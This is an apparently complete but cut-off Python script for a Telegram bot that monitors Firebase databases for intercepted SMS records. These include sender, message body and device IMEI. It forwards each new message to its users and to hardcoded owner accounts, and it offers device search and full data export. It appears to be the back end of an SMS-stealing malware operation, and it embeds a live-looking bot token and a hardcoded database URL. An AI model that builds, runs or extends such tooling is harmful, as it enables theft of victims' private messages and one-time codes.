import os
import requests
import json
import time
import threading
import hashlib
import html
from datetime import datetime, timezone
from io import BytesIO

# Try to import optional packages
try:
    import speedtest
    SPEEDTEST_AVAILABLE = True
except ImportError:
    SPEEDTEST_AVAILABLE = False
    print("⚠️ speedtest-cli not installed")

try:
    from sseclient import SSEClient
    SSE_AVAILABLE = True
except ImportError:
    SSE_AVAILABLE = False
    print("⚠️ sseclient-py not installed")

# ---------------- CONFIG ----------------
BOT_TOKEN = "8500713256:AAF8TjCbO7aj-3GofffCE2H5b0xSU3NUbGc"

if not BOT_TOKEN or BOT_TOKEN.strip() == "":
    print("❌ BOT_TOKEN missing!")
    raise SystemExit(1)

API_URL = f"https://api.telegram.org/bot{BOT_TOKEN}"
OWNER_IDS = [1451422178]
PRIMARY_ADMIN_ID = 1451422178
POLL_INTERVAL = 2
MAX_SSE_RETRIES = 5
MAX_FIREBASE_PER_USER = 5

# DEFAULT FIREBASE CONFIGURATION
DEFAULT_FIREBASE_URL = "https://union-1-1b7ae-default-rtdb.asia-southeast1.firebasedatabase.app/.json"
DEFAULT_FIREBASE_ENABLED = True
CACHE_REFRESH_SECONDS = 1200
# ---------------------------------------

OFFSET = None
running = True
firebase_urls = {}
watcher_threads = {}
seen_hashes = {}
approved_users = set(OWNER_IDS)
BOT_START_TIME = time.time()
firebase_cache = {}
cache_time = {}
blocked_devices = set()
used_firebase_urls = set()
pending_permissions = {}
user_firebase_count = {}

default_firebase_active = False
default_firebase_thread = None

user_states = {}
user_last_command = {}  # Track last command time to prevent duplicates

# ---------- KEYBOARD BUTTONS ----------
def get_main_keyboard(is_admin=False):
    keyboard = [
        ["📋 My URLs", "🔍 Find Device"],
        ["📄 Export All Data", "🔄 Refresh Cache"],
        ["🏓 Status", "🛑 Stop All"],
        ["❓ Help"]
    ]
    if is_admin:
        keyboard.append(["👑 Admin Panel"])
    return {"keyboard": keyboard, "resize_keyboard": True, "one_time_keyboard": False}

def get_admin_keyboard():
    keyboard = [
        ["👥 Approve User", "🚫 Unapprove User"],
        ["📋 All Users", "📊 Statistics"],
        ["🔒 Block Device", "🔓 Unblock Device"],
        ["📵 Blocked List", "🌐 Default Firebase"],
        ["📢 Broadcast", "🛑 Stop All Users"],
        ["◀️ Back to Main"]
    ]
    return {"keyboard": keyboard, "resize_keyboard": True, "one_time_keyboard": False}

def get_default_firebase_keyboard():
    keyboard = [
        ["▶️ Start Default", "⏹️ Stop Default"],
        ["🔄 Refresh Default", "📊 Default Status"],
        ["◀️ Back to Admin"]
    ]
    return {"keyboard": keyboard, "resize_keyboard": True, "one_time_keyboard": False}

# ---------- UTILITY FUNCTIONS ----------
def normalize_json_url(url):
    if not url:
        return None
    u = url.rstrip("/")
    if not u.endswith(".json"):
        u = u + "/.json"
    return u

def send_msg(chat_id, text, parse_mode="HTML", reply_markup=None, keyboard=None):
    def _send_one(cid):
        try:
            payload = {"chat_id": cid, "text": text}
            if parse_mode:
                payload["parse_mode"] = parse_mode
            if reply_markup is not None:
                payload["reply_markup"] = reply_markup
            elif keyboard is not None:
                payload["reply_markup"] = keyboard
            requests.post(f"{API_URL}/sendMessage", json=payload, timeout=10)
        except Exception as e:
            print(f"send_msg failed: {e}")
    if isinstance(chat_id, (list, tuple, set)):
        for cid in chat_id:
            _send_one(cid)
    else:
        _send_one(chat_id)

def send_document(chat_id, file_bytes, filename, caption=""):
    try:
        files = {'document': (filename, BytesIO(file_bytes), 'text/plain')}
        data = {'chat_id': chat_id, 'caption': caption}
        requests.post(f"{API_URL}/sendDocument", files=files, data=data, timeout=30)
    except Exception as e:
        print(f"Error sending document: {e}")
        send_msg(chat_id, f"❌ Failed to send file: {e}")

def get_updates():
    global OFFSET
    try:
        params = {"timeout": 20}
        if OFFSET:
            params["offset"] = OFFSET
        r = requests.get(f"{API_URL}/getUpdates", params=params, timeout=30).json()
        if r.get("result"):
            OFFSET = r["result"][-1]["update_id"] + 1
        return r.get("result", [])
    except Exception as e:
        print("get_updates error:", e)
        return []

def http_get_json(url):
    try:
        r = requests.get(url, timeout=12)
        r.raise_for_status()
        return r.json()
    except Exception as e:
        print("http_get_json error:", e)
        return None

def is_sms_like(obj):
    if not isinstance(obj, dict):
        return False
    keys = {k.lower() for k in obj.keys()}
    score = 0
    if keys & {"message", "msg", "body", "text", "sms"}:
        score += 2
    if keys & {"from", "sender", "address", "source", "number"}:
        score += 2
    if keys & {"time", "timestamp", "ts", "date", "created_at"}:
        score += 1
    if keys & {"device", "deviceid", "imei", "device_id", "phoneid"}:
        score += 1
    return score >= 3

def find_sms_nodes(snapshot, path=""):
    found = []
    if isinstance(snapshot, dict):
        for k, v in snapshot.items():
            p = f"{path}/{k}" if path else k
            if is_sms_like(v):
                found.append((p, v))
            if isinstance(v, (dict, list)):
                found += find_sms_nodes(v, p)
    elif isinstance(snapshot, list):
        for i, v in enumerate(snapshot):
            p = f"{path}/{i}"
            if is_sms_like(v):
                found.append((p, v))
            if isinstance(v, (dict, list)):
                found += find_sms_nodes(v, p)
    return found

def extract_fields(obj):
    device = obj.get("device") or obj.get("deviceId") or obj.get("device_id") or obj.get("imei") or obj.get("id") or "Unknown"
    sender = obj.get("from") or obj.get("sender") or obj.get("address") or obj.get("number") or "Unknown"
    message = obj.get("message") or obj.get("msg") or obj.get("body") or obj.get("text") or ""
    ts = obj.get("time") or obj.get("timestamp") or obj.get("date") or obj.get("created_at") or None
    if isinstance(ts, (int, float)):
        try:
            ts = datetime.fromtimestamp(float(ts), tz=timezone.utc).astimezone().strftime("%d/%m/%Y, %I:%M:%S %p")
        except:
            ts = str(ts)
    if not ts:
        ts = datetime.now().strftime("%d/%m/%Y, %I:%M:%S %p")
    device_phone = obj.get("phone") or obj.get("mobile") or obj.get("MobileNumber") or None
    return {
        "device": device,
        "sender": sender,
        "message": message,
        "time": ts,
        "device_phone": device_phone,
        "raw_data": obj
    }

def compute_hash(path, obj):
    try:
        return hashlib.sha1((path + json.dumps(obj, sort_keys=True, default=str)).encode()).hexdigest()
    except:
        return hashlib.sha1((path + str(obj)).encode()).hexdigest()

def format_notification(fields, user_id, is_default=False):
    device = html.escape(str(fields.get("device", "Unknown")))
    sender = html.escape(str(fields.get("sender", "Unknown")))
    message = html.escape(str(fields.get("message", "")))
    t = html.escape(str(fields.get("time", "")))
    
    if is_default:
        text = f"🆕 <b>New SMS Received (Default Firebase)</b>\n\n📱 Device: <code>{device}</code>\n👤 From: <b>{sender}</b>\n💬 Message: {message}\n🕐 Time: {t}\n👤 Forwarded by Admin Only"
    else:
        text = f"🆕 <b>New SMS Received</b>\n\n📱 Device: <code>{device}</code>\n👤 From: <b>{sender}</b>\n💬 Message: {message}\n🕐 Time: {t}\n👤 Forwarded by User ID: <code>{user_id}</code>"
    
    if fields.get("device_phone"):
        text += f"\n📞 Device Number: <code>{html.escape(str(fields.get('device_phone')))}</code>"
    return text

def notify_user_owner(chat_id, fields, is_default=False):
    device_id = fields.get("device", "")
    if device_id and device_id in blocked_devices:
        return
    if is_default:
        send_msg(OWNER_IDS, format_notification(fields, chat_id, is_default=True))
    else:
        send_msg(chat_id, format_notification(fields, chat_id, is_default=False))
        send_msg(OWNER_IDS, format_notification(fields, chat_id, is_default=False))

# ---------- SSE WATCHER ----------
def sse_loop(chat_id, base_url, is_default=False):
    url = base_url.rstrip("/")
    if not url.endswith(".json"):
        url = url + "/.json"
    stream_url = url + "?print=silent"
    
    if is_default:
        seen_key = "__DEFAULT_FIREBASE__"
        if seen_key not in seen_hashes:
            seen_hashes[seen_key] = {}
        if base_url not in seen_hashes[seen_key]:
            seen_hashes[seen_key][base_url] = set()
        seen = seen_hashes[seen_key][base_url]
    else:
        seen = seen_hashes.setdefault(chat_id, {}).setdefault(base_url, set())
    
    if not is_default:
        send_msg(chat_id, f"⚡ Monitoring started for:\n<code>{base_url}</code>")
    
    retries = 0
    
    while (is_default and DEFAULT_FIREBASE_ENABLED) or (not is_default and base_url in firebase_urls.get(chat_id, [])):
        try:
            if SSE_AVAILABLE:
                client = SSEClient(stream_url)
                for event in client.events():
                    if not ((is_default and DEFAULT_FIREBASE_ENABLED) or (not is_default and base_url in firebase_urls.get(chat_id, []))):
                        break
                    if not event.data or event.data == "null":
                        continue
                    try:
                        data = json.loads(event.data)
                    except:
                        continue
                    payload = data.get("data") if isinstance(data, dict) and "data" in data else data
                    nodes = find_sms_nodes(payload, "")
                    for path, obj in nodes:
                        h = compute_hash(path, obj)
                        if h in seen:
                            continue
                        seen.add(h)
                        fields = extract_fields(obj)
                        if fields.get("device", "") in blocked_devices:
                            continue
                        if is_default:
                            notify_user_owner(None, fields, is_default=True)
                        else:
                            notify_user_owner(chat_id, fields, is_default=False)
            else:
                poll_loop(chat_id, base_url, is_default)
                break
            retries = 0
        except Exception as e:
            retries += 1
            if retries >= MAX_SSE_RETRIES:
                if not is_default:
                    poll_loop(chat_id, base_url, is_default)
                break
            time.sleep(min(30, 2 ** retries))

def poll_loop(chat_id, base_url, is_default=False):
    url = base_url.rstrip("/")
    if not url.endswith(".json"):
        url = url + "/.json"
    
    if is_default:
        seen_key = "__DEFAULT_FIREBASE__"
        if seen_key not in seen_hashes:
            seen_hashes[seen_key] = {}
        if base_url not in seen_hashes[seen_key]:
            seen_hashes[seen_key][base_url] = set()
        seen = seen_hashes[seen_key][base_url]
    else:
        seen = seen_hashes.setdefault(chat_id, {}).setdefault(base_url, set())
    
    while (is_default and DEFAULT_FIREBASE_ENABLED) or (not is_default and base_url in firebase_urls.get(chat_id, [])):
        snap = http_get_json(url)
        if snap:
            nodes = find_sms_nodes(snap, "")
            for path, obj in nodes:
                h = compute_hash(path, obj)
                if h in seen:
                    continue
                seen.add(h)
                fields = extract_fields(obj)
                if fields.get("device", "") in blocked_devices:
                    continue
                if is_default:
                    notify_user_owner(None, fields, is_default=True)
                else:
                    notify_user_owner(chat_id, fields, is_default=False)
        time.sleep(POLL_INTERVAL)

# ---------- DEFAULT FIREBASE ----------
def start_default_firebase():
    global default_firebase_active, default_firebase_thread
    if not DEFAULT_FIREBASE_ENABLED or default_firebase_active:
        return default_firebase_active
    
    if not http_get_json(normalize_json_url(DEFAULT_FIREBASE_URL)):
        send_msg(OWNER_IDS, "❌ Default Firebase URL not accessible")
        return False
    
    used_firebase_urls.add(DEFAULT_FIREBASE_URL)
    seen_key = "__DEFAULT_FIREBASE__"
    if seen_key not in seen_hashes:
        seen_hashes[seen_key] = {}
    seen_hashes[seen_key][DEFAULT_FIREBASE_URL] = set()
    
    snap = http_get_json(normalize_json_url(DEFAULT_FIREBASE_URL))
    if snap:
        for p, o in find_sms_nodes(snap, ""):
            seen_hashes[seen_key][DEFAULT_FIREBASE_URL].add(compute_hash(p, o))
    
    default_firebase_thread = threading.Thread(target=sse_loop, args=(None, DEFAULT_FIREBASE_URL, True), daemon=True)
    default_firebase_thread.start()
    default_firebase_active = True
    send_msg(OWNER_IDS, f"✅ Default Firebase started.")
    return True

def stop_default_firebase():
    global default_firebase_active
    if not default_firebase_active:
        return False
    default_firebase_active = False
    if DEFAULT_FIREBASE_URL in used_firebase_urls:
        used_firebase_urls.remove(DEFAULT_FIREBASE_URL)
    send_msg(OWNER_IDS, f"🛑 Default Firebase stopped.")
    return True

# ---------- START / STOP ----------
def start_watcher(chat_id, base_url):
    if chat_id not in firebase_urls:
        firebase_urls[chat_id] = []
    if base_url in firebase_urls[chat_id]:
        send_msg(chat_id, f"⚠️ Already monitoring: <code>{base_url}</code>")
        return False
    
    if len(firebase_urls.get(chat_id, [])) >= MAX_FIREBASE_PER_USER:
        send_msg(chat_id, f"❌ Limit reached ({MAX_FIREBASE_PER_USER})")
        return False
    
    firebase_urls[chat_id].append(base_url)
    if chat_id not in seen_hashes:
        seen_hashes[chat_id] = {}
    seen_hashes[chat_id][base_url] = set()
    used_firebase_urls.add(base_url)
    
    json_url = normalize_json_url(base_url)
    snap = http_get_json(json_url)
    if snap:
        for p, o in find_sms_nodes(snap, ""):
            seen_hashes[chat_id][base_url].add(compute_hash(p, o))
    
    t = threading.Thread(target=sse_loop, args=(chat_id, base_url, False), daemon=True)
    if chat_id not in watcher_threads:
        watcher_threads[chat_id] = []
    watcher_threads[chat_id].append(t)
    t.start()
    
    send_msg(chat_id, f"✅ Monitoring started: <code>{base_url}</code>")
    return True

def stop_watcher_single(chat_id, base_url=None):
    if chat_id not in firebase_urls or not firebase_urls[chat_id]:
        return False
    
    if base_url is None:
        urls_to_stop = firebase_urls[chat_id].copy()
    else:
        if base_url not in firebase_urls[chat_id]:
            return False
        urls_to_stop = [base_url]
    
    for url in urls_to_stop:
        if url in firebase_urls[chat_id]:
            firebase_urls[chat_id].remove(url)
        if url in used_firebase_urls:
            if not any(url in urls for urls in firebase_urls.values()):
                used_firebase_urls.remove(url)
        if chat_id in seen_hashes and url in seen_hashes[chat_id]:
            del seen_hashes[chat_id][url]
    
    if not firebase_urls.get(chat_id):
        firebase_urls.pop(chat_id, None)
        seen_hashes.pop(chat_id, None)
    
    if base_url is None:
        send_msg(chat_id, "🛑 All monitoring stopped.")
    else:
        send_msg(chat_id, f"🛑 Stopped: <code>{base_url}</code>")
    return True

def stop_all_watchers():
    total = 0
    for chat_id in list(firebase_urls.keys()):
        if stop_watcher_single(chat_id):
            total += 1
    return total

# ---------- BLOCK FUNCTIONS ----------
def block_device(device_id):
    blocked_devices.add(device_id)
    return True

def unblock_device(device_id):
    if device_id in blocked_devices:
        blocked_devices.remove(device_id)
        return True
    return False

def get_blocked_devices():
    return sorted(list(blocked_devices))

# ---------- APPROVAL HELPERS ----------
def is_owner(user_id):
    return user_id in OWNER_IDS

def is_approved(user_id):
    return user_id in approved_users or is_owner(user_id)

def handle_not_approved(chat_id, msg):
    from_user = msg.get("from", {}) or {}
    first_name = from_user.get("first_name", "")
    username = from_user.get("username", None)
    reply_markup = {"inline_keyboard": [[{"text": "📨 Contact Admin", "url": f"tg://user?id={PRIMARY_ADMIN_ID}"}]]}
    send_msg(chat_id, f"❌ You are not approved.\nTap below to contact admin.\n🆔 Your ID: <code>{chat_id}</code>", reply_markup=reply_markup)
    owner_text = [f"⚠️ New user:\nID: <code>{chat_id}</code>\nName: {html.escape(first_name)}\nApprove: <code>/approve {chat_id}</code>"]
    if username:
        owner_text.append(f"Username: @{html.escape(username)}")
    send_msg(OWNER_IDS, "\n".join(owner_text))

def format_uptime(seconds):
    days = seconds // 86400
    seconds %= 86400
    hours = seconds // 3600
    seconds %= 3600
    minutes = seconds // 60
    seconds %= 60
    parts = []
    if days: parts.append(f"{days}d")
    if hours: parts.append(f"{hours}h")
    if minutes: parts.append(f"{minutes}m")
    parts.append(f"{seconds}s")
    return " ".join(parts)

# ---------- SEARCH FUNCTIONS ----------
def get_all_records_by_device(snapshot, device_id, records=None):
    if records is None:
        records = []
    
    if isinstance(snapshot, dict):
        for k, v in snapshot.items():
            if str(k) == str(device_id) and isinstance(v, dict):
                records.append(v)
            if isinstance(v, dict):
                device_fields = ["device", "deviceId", "device_id", "DeviceID", "DeviceId", "imei", "id"]
                for field in device_fields:
                    if field in v and str(v[field]) == str(device_id):
                        records.append(v)
                        break
            if isinstance(v, (dict, list)):
                get_all_records_by_device(v, device_id, records)
    elif isinstance(snapshot, list):
        for v in snapshot:
            if isinstance(v, dict):
                device_fields = ["device", "deviceId", "device_id", "DeviceID", "DeviceId", "imei", "id"]
                for field in device_fields:
                    if field in v and str(v[field]) == str(device_id):
                        records.append(v)
                        break
            if isinstance(v, (dict, list)):
                get_all_records_by_device(v, device_id, records)
    
    return records

def get_unique_records(records):
    unique = []
    seen = set()
    for rec in records:
        rec_str = json.dumps(rec, sort_keys=True, default=str)
        if rec_str not in seen:
            seen.add(rec_str)
            unique.append(rec)
    return unique

def format_full_record(rec, index=None):
    """Format complete record - ALL fields, NO Firebase URL"""
    lines = []
    if index is not None:
        lines.append(f"📌 <b>Record #{index}</b>")
        lines.append("")
    
    # Show ALL fields in the record
    for k, v in rec.items():
        if v is not None and v != "":
            lines.append(f"<b>{html.escape(str(k))}</b>: <code>{html.escape(str(v))}</code>")
    
    return "\n".join(lines)

def export_all_device_data(chat_id, device_id):
    urls = firebase_urls.get(chat_id, [])
    if not urls:
        return None, "❌ No active URLs to search"
    
    all_records = []
    for url in urls:
        snap = http_get_json(normalize_json_url(url))
        if snap:
            records = get_all_records_by_device(snap, device_id)
            all_records.extend(records)
    
    unique_records = get_unique_records(all_records)
    
    if not unique_records:
        return None, f"🔍 No records found for device: {device_id}"
    
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"device_{device_id}_{timestamp}.txt"
    
    content_lines = [
        "=" * 80,
        f"DEVICE EXPORT - {device_id}",
        f"Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
        f"Total Unique Records: {len(unique_records)}",
        "=" * 80,
        "", ""
    ]
    
    for idx, rec in enumerate(unique_records, 1):
        content_lines.append(f"[RECORD #{idx}]")
        content_lines.append("-" * 40)
        for k, v in rec.items():
            content_lines.append(f"{k}: {v}")
        content_lines.append("")
        content_lines.append("")
    
    return "\n".join(content_lines).encode('utf-8'), filename

# ---------- COMMAND HANDLING ----------
def handle_button_press(chat_id, text, is_admin=False):
    if text == "📋 My URLs":
        urls = firebase_urls.get(chat_id, [])
        if not urls:
            send_msg(chat_id, "ℹ️ No active URLs", keyboard=get_main_keyboard(is_admin))
        else:
            msg = f"📋 Your URLs ({len(urls)}/{MAX_FIREBASE_PER_USER}):\n\n"
            for i, url in enumerate(urls, 1):
                msg += f"{i}. <code>{url}</code>\n"
            send_msg(chat_id, msg, keyboard=get_main_keyboard(is_admin))
        return True
    
    elif text == "🔍 Find Device":
        send_msg(chat_id, "🔍 Send Device ID to search\n\nExample: /find de503ff1e58b1888\n\nFirst 3 UNIQUE records will be shown with ALL fields.", keyboard=get_main_keyboard(is_admin))
        user_states[chat_id] = "waiting_for_device"
        return True
    
    elif text == "📄 Export All Data":
        send_msg(chat_id, "📄 Send Device ID to export ALL data\n\nExample: /finda de503ff1e58b1888", keyboard=get_main_keyboard(is_admin))
        user_states[chat_id] = "waiting_for_export"
        return True
    
    elif text == "🔄 Refresh Cache":
        send_msg(chat_id, "✅ Cache refreshed", keyboard=get_main_keyboard(is_admin))
        return True
    
    elif text == "🏓 Status":
        uptime = format_uptime(int(time.time() - BOT_START_TIME))
        msg = f"🏓 <b>Bot Status</b>\n\n✅ Online\n⏱ Uptime: {uptime}\n📡 Your URLs: {len(firebase_urls.get(chat_id, []))}/{MAX_FIREBASE_PER_USER}"
        send_msg(chat_id, msg, keyboard=get_main_keyboard(is_admin))
        return True
    
    elif text == "🛑 Stop All":
        stop_watcher_single(chat_id)
        send_msg(chat_id, "🛑 All monitoring stopped", keyboard=get_main_keyboard(is_admin))
        return True
    
    elif text == "❓ Help":
        help_msg = "📚 <b>Commands</b>\n\n/find <id> - Search device (first 3 unique records)\n/finda <id> - Export ALL data\n/start - Welcome\n/stop - Stop monitoring\n/list - Your URLs\n/ping - Status\n/help - This message"
        send_msg(chat_id, help_msg, keyboard=get_main_keyboard(is_admin))
        return True
    
    elif text == "👑 Admin Panel" and is_admin:
        send_msg(chat_id, "👑 Admin Panel", keyboard=get_admin_keyboard())
        return True
    
    elif text == "👥 Approve User" and is_admin:
        send_msg(chat_id, "Send user ID: /approve 123456789", keyboard=get_admin_keyboard())
        user_states[chat_id] = "waiting_for_approve"
        return True
    
    elif text == "🚫 Unapprove User" and is_admin:
        send_msg(chat_id, "Send user ID: /unapprove 123456789", keyboard=get_admin_keyboard())
        user_states[chat_id] = "waiting_for_unapprove"
        return True
    
    elif text == "📋 All Users" and is_admin:
        if not approved_users:
            send_msg(chat_id, "No approved users", keyboard=get_admin_keyboard())
            return True
        lines = [f"{'👑' if uid in OWNER_IDS else '👤'} <code>{uid}</code>" for uid in sorted(approved_users)]
        send_msg(chat_id, "✅ Users:\n" + "\n".join(lines), keyboard=get_admin_keyboard())
        return True
    
    elif text == "📊 Statistics" and is_admin:
        stats = f"📊 Stats\n\nApproved: {len(approved_users)}\nActive: {len(firebase_urls)}\nBlocked: {len(blocked_devices)}\nDefault: {'Active' if default_firebase_active else 'Inactive'}"
        send_msg(chat_id, stats, keyboard=get_admin_keyboard())
        return True
    
    elif text == "🔒 Block Device" and is_admin:
        send_msg(chat_id, "Send device ID: /block de503ff1e58b1888", keyboard=get_admin_keyboard())
        user_states[chat_id] = "waiting_for_block"
        return True
    
    elif text == "🔓 Unblock Device" and is_admin:
        send_msg(chat_id, "Send device ID: /unblock de503ff1e58b1888", keyboard=get_admin_keyboard())
        user_states[chat_id] = "waiting_for_unblock"
        return True
    
    elif text == "📵 Blocked List" and is_admin:
        devices = get_blocked_devices()
        if not devices:
            send_msg(chat_id, "No blocked devices", keyboard=get_admin_keyboard())
        else:
            send_msg(chat_id, "🚫 Blocked:\n" + "\n".join([f"• <code>{d}</code>" for d in devices]), keyboard=get_admin_keyboard())
        return True
    
    elif text == "🌐 Default Firebase" and is_admin:
        send_msg(chat_id, "🌐 Default Firebase Management", keyboard=get_default_firebase_keyboard())
        return True
    
    elif text == "📢 Broadcast" and is_admin:
        send_msg(chat_id, "Send message: /broadcast Hello", keyboard=get_admin_keyboard())
        user_states[chat_id] = "waiting_for_broadcast"
        return True
    
    elif text == "🛑 Stop All Users" and is_admin:
        count = stop_all_watchers()
        send_msg(chat_id, f"Stopped {count} users", keyboard=get_admin_keyboard())
        return True
    
    elif text == "▶️ Start Default" and is_admin:
        if start_default_firebase():
            send_msg(chat_id, "✅ Default started", keyboard=get_default_firebase_keyboard())
        else:
            send_msg(chat_id, "❌ Failed", keyboard=get_default_firebase_keyboard())
        return True
    
    elif text == "⏹️ Stop Default" and is_admin:
        if stop_default_firebase():
            send_msg(chat_id, "✅ Default stopped", keyboard=get_default_firebase_keyboard())
        else:
            send_msg(chat_id, "Not active", keyboard=get_default_firebase_keyboard())
        return True
    
    elif text == "🔄 Refresh Default" and is_admin:
        send_msg(chat_id, "✅ Default cache refreshed", keyboard=get_default_firebase_keyboard())
        return True
    
    elif text == "📊 Default Status" and is_admin:
        status = "Active ✅" if default_firebase_active else "Inactive ❌"
        send_msg(chat_id, f"Default Firebase: {status}", keyboard=get_default_firebase_keyboard())
        return True
    
    elif text == "◀️ Back to Admin" and is_admin:
        send_msg(chat_id, "Admin Panel", keyboard=get_admin_keyboard())
        return True
    
    elif text == "◀️ Back to Main":
        send_msg(chat_id, "Main Menu", keyboard=get_main_keyboard(is_admin))
        return True
    
    return False

def handle_update(u):
    if "callback_query" in u:
        try:
            requests.post(f"{API_URL}/answerCallbackQuery", json={"callback_query_id": u["callback_query"]["id"]})
        except:
            pass
        return
    
    msg = u.get("message") or {}
    chat = msg.get("chat", {}) or {}
    chat_id = chat.get("id")
    text = (msg.get("text") or "").strip()
    if not chat_id:
        return
    
    # Check waiting states
    if chat_id in user_states:
        state = user_states[chat_id]
        is_admin_user = is_owner(chat_id)
        
        if state == "waiting_for_device":
            del user_states[chat_id]
            text = f"/find {text}"
        elif state == "waiting_for_export":
            del user_states[chat_id]
            text = f"/finda {text}"
        elif state == "waiting_for_approve" and is_admin_user:
            del user_states[chat_id]
            text = f"/approve {text}"
        elif state == "waiting_for_unapprove" and is_admin_user:
            del user_states[chat_id]
            text = f"/unapprove {text}"
        elif state == "waiting_for_block" and is_admin_user:
            del user_states[chat_id]
            text = f"/block {text}"
        elif state == "waiting_for_unblock" and is_admin_user:
            del user_states[chat_id]
            text = f"/unblock {text}"
        elif state == "waiting_for_broadcast" and is_admin_user:
            del user_states[chat_id]
            text = f"/broadcast {text}"
    
    # Handle buttons
    is_admin = is_owner(chat_id)
    button_texts = ["📋 My URLs", "🔍 Find Device", "📄 Export All Data", "🔄 Refresh Cache", "🏓 Status", "🛑 Stop All", "❓ Help", "👑 Admin Panel",
                    "👥 Approve User", "🚫 Unapprove User", "📋 All Users", "📊 Statistics", "🔒 Block Device", "🔓 Unblock Device",
                    "📵 Blocked List", "🌐 Default Firebase", "📢 Broadcast", "🛑 Stop All Users", "▶️ Start Default", "⏹️ Stop Default",
                    "🔄 Refresh Default", "📊 Default Status", "◀️ Back to Admin", "◀️ Back to Main"]
    if text in button_texts:
        if handle_button_press(chat_id, text, is_admin):
            return
    
    if not text:
        return
    
    lower_text = text.lower()
    
    if not is_approved(chat_id):
        handle_not_approved(chat_id, msg)
        return
    
    # /start - Only once
    if lower_text == "/start":
        if chat_id in user_last_command and time.time() - user_last_command[chat_id] < 5:
            return
        user_last_command[chat_id] = time.time()
        welcome_msg = "👋 <b>Welcome!</b>\n\nSend Firebase URL to start monitoring\n/find <id> - Search records\n/finda <id> - Export all data"
        send_msg(chat_id, welcome_msg, keyboard=get_main_keyboard(is_admin))
        return
    
    # /ping
    if lower_text == "/ping":
        uptime = format_uptime(int(time.time() - BOT_START_TIME))
        send_msg(chat_id, f"🏓 Online\n⏱ Uptime: {uptime}", keyboard=get_main_keyboard(is_admin))
        return
    
    # /stop
    if lower_text.startswith("/stop"):
        parts = text.split(maxsplit=1)
        if len(parts) == 1:
            stop_watcher_single(chat_id)
        else:
            url = parts[1].strip()
            if url.startswith("http"):
                stop_watcher_single(chat_id, url)
        send_msg(chat_id, "✅ Done", keyboard=get_main_keyboard(is_admin))
        return
    
    # /list
    if lower_text == "/list":
        urls = firebase_urls.get(chat_id, [])
        if not urls:
            send_msg(chat_id, "ℹ️ No active URLs", keyboard=get_main_keyboard(is_admin))
        else:
            msg = f"📋 Your URLs ({len(urls)}):\n\n" + "\n".join([f"{i+1}. <code>{url}</code>" for i, url in enumerate(urls)])
            send_msg(chat_id, msg, keyboard=get_main_keyboard(is_admin))
        return
    
    # Admin commands
    if is_admin:
        if lower_text == "/default_start":
            start_default_firebase()
            send_msg(chat_id, "✅ Default started", keyboard=get_admin_keyboard())
            return
        if lower_text == "/default_stop":
            stop_default_firebase()
            send_msg(chat_id, "✅ Default stopped", keyboard=get_admin_keyboard())
            return
        if lower_text == "/approve":
            parts = text.split()
            if len(parts) >= 2:
                try:
                    target = int(parts[1])
                    approved_users.add(target)
                    send_msg(chat_id, f"✅ Approved: <code>{target}</code>", keyboard=get_admin_keyboard())
                    send_msg(target, "✅ You are approved! Send /start")
                except:
                    send_msg(chat_id, "❌ Invalid ID", keyboard=get_admin_keyboard())
            return
        if lower_text == "/unapprove":
            parts = text.split()
            if len(parts) >= 2:
                try:
                    target = int(parts[1])
                    if target in OWNER_IDS:
                        send_msg(chat_id, "❌ Cannot unapprove owner", keyboard=get_admin_keyboard())
                        return
                    if target in approved_users:
                        approved_users.remove(target)
                        stop_watcher_single(target)
                        send_msg(chat_id, f"🚫 Unapproved: <code>{target}</code>", keyboard=get_admin_keyboard())
                        send_msg(target, "❌ Access revoked")
                except:
                    send_msg(chat_id, "❌ Invalid ID", keyboard=get_admin_keyboard())
            return
        if lower_text == "/block":
            parts = text.split()
            if len(parts) >= 2:
                block_device(parts[1])
                send_msg(chat_id, f"✅ Blocked: <code>{parts[1]}</code>", keyboard=get_admin_keyboard())
            return
        if lower_text == "/unblock":
            parts = text.split()
            if len(parts) >= 2:
                if unblock_device(parts[1]):
                    send_msg(chat_id, f"✅ Unblocked: <code>{parts[1]}</code>", keyboard=get_admin_keyboard())
                else:
                    send_msg(chat_id, f"Not blocked", keyboard=get_admin_keyboard())
            return
        if lower_text == "/broadcast":
            parts = text.split(maxsplit=1)
            if len(parts) >= 2:
                success = 0
                for uid in approved_users:
                    try:
                        send_msg(uid, f"📢 Broadcast\n\n{parts[1]}")
                        success += 1
                    except:
                        pass
                send_msg(chat_id, f"✅ Sent to {success} users", keyboard=get_admin_keyboard())
            return
    
    # /finda - Export all data
    if lower_text.startswith("/finda"):
        parts = text.split(maxsplit=1)
        if len(parts) < 2:
            send_msg(chat_id, "Usage: /finda device_id", keyboard=get_main_keyboard(is_admin))
            return
        device = parts[1].strip()
        send_msg(chat_id, f"📤 Exporting data for: <code>{device}</code>...", keyboard=get_main_keyboard(is_admin))
        file_content, filename = export_all_device_data(chat_id, device)
        if file_content is None:
            send_msg(chat_id, filename, keyboard=get_main_keyboard(is_admin))
        else:
            send_document(chat_id, file_content, filename, f"Export: {device}")
        return
    
    # /find - First 3 unique records with ALL fields
    if lower_text.startswith("/find"):
        parts = text.split(maxsplit=1)
        if len(parts) < 2:
            send_msg(chat_id, "Usage: /find device_id\n\nExample: /find de503ff1e58b1888", keyboard=get_main_keyboard(is_admin))
            return
        device = parts[1].strip()
        urls = firebase_urls.get(chat_id, [])
        
        if not urls:
            send_msg(chat_id, "❌ No active URLs. Send a Firebase URL first!", keyboard=get_main_keyboard(is_admin))
            return
        
        all_records = []
        seen_keys = set()
        
        for url in urls:
            snap = http_get_json(normalize_json_url(url))
            if snap:
                records = get_all_records_by_device(snap, device)
                for rec in records:
                    rec_key = json.dumps(rec, sort_keys=True, default=str)
                    if rec_key not in seen_keys:
                        seen_keys.add(rec_key)
                        all_records.append(rec)
        
        unique_records = all_records[:3]
        
        if unique_records:
            total = len(all_records)
            send_msg(chat_id, f"🔍 Found {total} UNIQUE record(s) for: <code>{device}</code>\n\nShowing first {min(3, total)}:", keyboard=get_main_keyboard(is_admin))
            
            for idx, rec in enumerate(unique_records, 1):
                formatted = format_full_record(rec, idx)
                send_msg(chat_id, formatted, keyboard=get_main_keyboard(is_admin))
            
            if total > 3:
                send_msg(chat_id, f"📌 {total - 3} more records. Use /finda {device} to export all.", keyboard=get_main_keyboard(is_admin))
        else:
            send_msg(chat_id, f"🔍 No records found for: <code>{device}</code>", keyboard=get_main_keyboard(is_admin))
        return
    
    # /help
    if lower_text == "/help":
